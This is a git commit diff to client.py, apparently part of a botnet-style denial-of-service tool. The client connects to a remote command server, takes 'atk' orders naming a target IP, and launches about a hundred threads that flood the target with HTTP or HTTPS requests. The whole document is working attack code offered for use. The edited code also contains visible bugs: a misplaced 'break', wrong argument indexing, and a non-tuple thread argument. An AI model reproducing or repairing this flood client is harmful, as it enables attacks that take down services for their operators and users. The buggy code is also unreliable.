77703e2372b48affee00e30934cd52d0af6a465e
binlaab <71317374+binlaab@users.noreply.github.com>
2022-01-26 19:52:36 +0100

    mini fix

--- client.py
+++ client.py
@@ -5,6 +5,7 @@ import requests
 ADDRESS = "" # replace this with your server's IP address
 DEFAULT_WORKERS = 100
 THREADS = []
+is_https = False
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ADDRESS, 57849))
@@ -12,7 +13,7 @@ s.connect((ADDRESS, 57849))
 
 def atk(ip, port):
     try:
-        r = requests.get(f"http://{ip}:{port}")
+        r = requests.get(f"http://{ip}" if not is_https else f"https://{ip}")
         print("sent request")
     except:
         print("The port specified does not have a web service running or it is closed.")
@@ -22,16 +23,14 @@ while True and s:
     data = s.recv(128)
     data = data.decode('utf-8').replace("\r\n", "")
     if data.startswith("atk"):
-        try:
-            ip = data.split(" ")[1]
-            port = data.split(" ")[2]
-            workers = int(data.split(" ")[3])
-        except:
-            s.send(b"You didn't specify an argument, please try again.")
-            workers = DEFAULT_WORKERS
+        ip = data.split(" ")[1]
+        port = None if len(data.split(" ")) < 2 else data.split(" ")[1]
+        workers = DEFAULT_WORKERS if len(data.split(" ")) < 3 else data.split(" ")[2]
+        is_https = True if "https" in ip else False
+        
             break
         for i in range(workers + 1):
-            t = threading.Thread(target=atk, args=(ip, port))
+            t = threading.Thread(target=atk, args=(ip))
             t.start()
             THREADS.append(t)
         for process in THREADS:
